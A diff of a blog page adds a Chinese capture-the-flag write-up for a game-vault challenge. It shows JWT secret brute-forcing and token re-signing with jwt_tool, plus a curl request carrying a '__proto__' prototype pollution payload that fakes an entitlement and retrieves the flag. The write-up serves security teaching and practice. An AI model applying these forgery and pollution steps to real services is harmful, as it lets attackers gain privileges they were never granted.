@@ -2259,6 +2259,8 @@
       
         
       
+        
+      
     
     
     
@@ -3108,6 +3110,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原型链污染
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
         
   
@@ -3642,6 +3674,245 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-23 13:30:00+00:00">2026-11-23</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">Web</a>, 
+              <a href="../jwt/" class="md-meta__link">JWT</a>, 
+              <a href="../%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-meta__link">原型链污染</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="jwt-uid1-entitlement"><a class="toclink" href="../../geek2019-garlic-vault/">[极客大挑战] 大蒜哥 — JWT 换成 uid=1，再往原型上塞一个 entitlement</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：JWT 伪造（弱密钥）+ 原型链污染</p>
+<p><strong>Flag</strong>：<code>SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../geek2019-garlic-vault/#_1">题目概述</a></h3>
+<p>注册登录后是个“游戏库”页面。<strong>表面上是点卡片启动游戏，实际上真相全在 <code>app.js</code> 里。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../geek2019-garlic-vault/#_2">解题过程</a></h3>
+<h4 id="step-1-token"><a class="toclink" href="../../geek2019-garlic-vault/#step-1-token">Step 1：先看 token 存在哪</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">TOKEN_KEY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"garlic_vault_token"</span><span class="p">;</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="kd">function</span><span class="w"> </span><span class="nx">token</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">TOKEN_KEY</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>JWT 存在 <code>localStorage</code>，键名是 <code>garlic_vault_token</code>。</strong></p>
+<p><strong>控制台里直接看：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>拿到 token 之后，再看它是怎么发出去的：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...(</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">())</span><span class="w"> </span><span class="nx">headers</span><span class="p">.</span><span class="nx">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="nx">options</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">().</span><span class="k">catch</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({}));</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"服务器暂时没有响应"</span><span class="p">);</span>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>所有请求都自动带上 <code>Authorization: Bearer &lt;token&gt;</code>。</strong></p>
+<p><strong>所以只要能改 token 内容，就能以任意身份调用接口。</strong></p>
+<h4 id="step-2"><a class="toclink" href="../../geek2019-garlic-vault/#step-2">Step 2：代码里直接告诉你该改什么</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">loadVault</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/vault"</span><span class="p">);</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">mode</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"owner"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="w">      </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/admin/games"</span><span class="p">);</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">loadOwnerPanel</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">consoleScript</span><span class="p">);</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderVisitor</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderLogin</span><span class="p">();</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="p">}</span>
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>
+</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a><span class="c1">// OWNER PROFILE // GARLIC #001</span>
+</span></code></pre></div>
+<p><strong>两个关键信息：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>state.mode === "owner"  → 才会调 /api/admin/games
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>// OWNER PROFILE // GARLIC #001   → 管理员是 #001，也就是 uid = 1
+</span></code></pre></div>
+<p><strong>所以目标是：把 JWT 里的 <code>uid</code> 改成 1。</strong></p>
+<h4 id="step-3-token"><a class="toclink" href="../../geek2019-garlic-vault/#step-3-token">Step 3：解 token，确认字段</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">cd </span><span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">tools</span><span class="p">\</span><span class="n">jwt_tool</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span>
+</span></code></pre></div>
+<p><strong>解出来：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>username = "12"
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>uid      = 2333
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>iat      = 1795410143
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>exp      = 1795417343
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>iss      = "garlic-private-server"
+</span></code></pre></div>
+<p><strong><code>uid: 2333</code> 是普通用户，要改成 <code>1</code>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../geek2019-garlic-vault/#step-4">Step 4：爆破签名密钥</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="s2">"C:\Users\崔路宽\Desktop\dict.txt"</span>
+</span></code></pre></div>
+<p><strong>爆破结果：<code>123123</code></strong></p>
+<p><strong>（这类题密钥几乎一定是纯数字或常见词，小字典跑几十秒就出。）</strong></p>
+<h4 id="step-5-uid1"><a class="toclink" href="../../geek2019-garlic-vault/#step-5-uid1">Step 5：用密钥重签 uid=1</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span></code></pre></div>
+<p><strong>得到的 payload 形如：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="p">{</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"12"</span><span class="p">,</span><span class="nt">"uid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"iat"</span><span class="p">:</span><span class="mi">1795410143</span><span class="p">,</span><span class="nt">"exp"</span><span class="p">:</span><span class="mi">1795417343</span><span class="p">,</span><span class="nt">"iss"</span><span class="p">:</span><span class="s2">"garlic-private-server"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>把新 token 写回 localStorage，然后刷新页面：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">,</span><span class="w"> </span><span class="s2">"&lt;新token&gt;"</span><span class="p">)</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>刷新后 <code>state.mode</code> 变成 <code>owner</code>，自动进入管理员面板。</strong></p>
+<h4 id="step-6"><a class="toclink" href="../../geek2019-garlic-vault/#step-6">Step 6：面板里的按钮全是装饰</a></h4>
+<p><strong>进去之后点卡片没反应。</strong>打开网络面板看，<strong>按钮只改了页面上的一行字，根本没发请求。</strong></p>
+<p><strong>真正有用的只有一段代码：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Endpoint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"/api/admin/gta6/launch"</span><span class="p">;</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Entitlement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"gta6_play"</span><span class="p">;</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">bootGta6</span><span class="p">(</span><span class="nx">app</span><span class="p">,</span><span class="w"> </span><span class="nx">api</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">gta6Endpoint</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span>
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/json"</span><span class="w"> </span><span class="p">},</span>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">game</span><span class="o">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span><span class="w"> </span><span class="nx">settings</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">quality</span><span class="o">:</span><span class="w"> </span><span class="s2">"ultra"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">})</span>
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="w">  </span><span class="p">});</span>
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="w">  </span><span class="nx">output</span><span class="p">.</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">flag</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"GTA6 已启动。"</span><span class="p">;</span>
+</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>注意这两个常量：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>端点          POST /api/admin/gta6/launch
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>权限标识      gta6_play   ← 后端就是看这个
+</span></code></pre></div>
+<p><strong>正常情况下用户没有 <code>gta6_play</code> 这个权限，所以拿不到 flag。</strong></p>
+<h4 id="step-7"><a class="toclink" href="../../geek2019-garlic-vault/#step-7">Step 7：用原型链污染伪造权限</a></h4>
+<p><strong>把请求体里的 <code>settings</code> 换掉，让 <code>gta6_play</code> 出现在</strong>原型链<strong>上：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="p">{</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="w">  </span><span class="nt">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="w">  </span><span class="nt">"settings"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"gta6_play"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>为什么这样能过：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>后端大概率做了把 settings 合并进某个对象（Object.assign / 展开）的动作
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>合并时 __proto__ 会把 gta6_play 挂到 Object.prototype 上
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>之后任何对象查 gta6_play 都会命中 → 权限判断通过
+</span></code></pre></div>
+<p><strong>这就是原型链污染：</strong>你没有那个字段，但你的<strong>原型</strong>有。**</p>
+<p><strong>拿 flag 的请求：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;uid=1的token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>  <span class="n">-d</span> <span class="s1">'{\"game\":\"gta6\",\"settings\":{\"__proto__\":{\"gta6_play\":true}}}'</span>
+</span></code></pre></div>
+<p><strong>返回里的 <code>flag</code> 字段就是答案：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="p">{</span><span class="nt">"unlocked"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">"title"</span><span class="p">:</span><span class="s2">"一男一女 / GTA6"</span><span class="p">,</span><span class="nt">"flag"</span><span class="p">:</span><span class="s2">"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong><code>unlocked: true</code> 这一项就是被污染出来的权限——原本用户并没有 <code>gta6_play</code>。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>关键点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>token 位置</td>
+<td><code>localStorage["garlic_vault_token"]</code></td>
+</tr>
+<tr>
+<td>发送方式</td>
+<td>每个请求自动加 <code>Authorization: Bearer</code></td>
+</tr>
+<tr>
+<td>身份判断</td>
+<td><code>state.mode === "owner"</code> 才进管理面板</td>
+</tr>
+<tr>
+<td>改名线索</td>
+<td>注释 <code>// OWNER PROFILE // GARLIC #001</code> → uid=1</td>
+</tr>
+<tr>
+<td>密钥</td>
+<td>爆破得 <code>123123</code></td>
+</tr>
+<tr>
+<td>重签</td>
+<td>只改 <code>uid</code>，其他字段原样保留</td>
+</tr>
+<tr>
+<td>按钮无效</td>
+<td>纯前端装饰，真正接口是 <code>/api/admin/gta6/launch</code></td>
+</tr>
+<tr>
+<td>权限标识</td>
+<td><code>gta6_play</code>（前端常量名 <code>gta6Entitlement</code>）</td>
+</tr>
+<tr>
+<td>污染点</td>
+<td><code>settings</code> 里的 <code>__proto__</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c"># ① 看 token</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="c"># 浏览器控制台：localStorage.getItem("garlic_vault_token")</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="c"># ② 解析 + 爆破</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="n">dict</span><span class="p">.</span><span class="n">txt</span>        <span class="c"># → 123123</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="c"># ③ 重签 uid=1</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a><span class="c"># ④ 写回并刷新</span>
+</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="c"># localStorage.setItem("garlic_vault_token","&lt;新token&gt;"); location.reload()</span>
+</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>
+</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a><span class="c"># ⑤ 原型链污染拿 flag</span>
+</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;新token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a>  <span class="n">-d</span> <span class="s1">'{"game":"gta6","settings":{"__proto__":{"gta6_play":true}}}'</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 进了面板就到处点</strong></p>
+<p><strong>卡片是纯前端装饰</strong>，点了只改页面文字。<strong>真正的价值在“网络”面板里那条 <code>console-script</code> / <code>gta6/launch</code> 请求。</strong></p>
+<p><strong>② 以为改了 uid 就能直接拿 flag</strong></p>
+<p><strong>uid=1 只给你“进门”的资格</strong>，<code>gta6_play</code> 这个权限还得自己造——<strong>这才是这题的第二个考点。</strong></p>
+<p><strong>③ 重签时把 iat/exp 写死成旧值</strong></p>
+<p><strong>token 有有效期</strong>，改签时最好把 <code>iat</code>/<code>exp</code> 更新到当前时间，否则改完还是过期。</p>
+<p><strong>④ <code>__proto__</code> 拼错</strong></p>
+<p>是<strong>两个下划线</strong>：<code>__proto__</code>。写成 <code>__potor__</code> 之类的，服务端只会把它当成一个普通字段，什么都不会发生。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
